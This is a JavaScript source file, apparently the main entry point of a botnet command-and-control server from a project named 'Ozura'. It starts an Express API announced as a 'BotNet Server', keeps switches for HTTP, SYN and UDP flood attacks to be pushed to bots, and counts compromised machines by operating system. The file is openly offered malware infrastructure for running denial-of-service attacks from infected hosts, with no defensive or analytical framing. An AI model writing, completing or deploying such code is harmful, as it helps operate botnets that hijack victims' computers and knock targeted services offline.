/* Script by: NaN 
*  Discord: NaN#7070
*  Github: https://github.com/NaNtheDev
*  Repos: https://github.com/NaNtheDev/Ozura
*  Apache-License 2.0
*  Reuse permited, but need this following tag
*/

const express = require('express');
const bodyParser = require('body-parser');
const { readdir } = require('fs');
const cors = require('cors')
const config = require('./config.json');
const data = require('./src/utils/database');

class Server {
    server = express()
    config = config;
    data = data;
    constructor({ ip, port }) {
        if (!this.data.command.has('command')) {
            this.data.command.set('command', {
                httpFlood: false,
                synFlood: false,
                udpFlood: false
            });
            this.data.stats.set('Windows', {
                count: 0
            });
            this.data.stats.set('Linux', {
                count: 0
            });
            this.data.stats.set('Darwin', {
                count: 0
            });
            this.data.stats.set('Java', {
                count: 0
            });
        };
        this.server.use(cors());
        this.server.use(bodyParser.urlencoded({ extended: true }));
        this.server.use(bodyParser.json());
        this.server.use(bodyParser.raw());

        readdir('./src/routes/', (err, files) => {
            if (err) return console.log(err);
            files.forEach(file => {
                const Routes = require(`./src/routes/${file}`);
                this.server.use('/api/', new Routes(this));
            });
            console.log(`${files.length} routes ready`);
        });
        this.server.listen(port, ip, () => console.log(`BotNet Server started on http://${ip}:${port}`))
    };
};

new Server({ ip: config.ip, port: config.port})
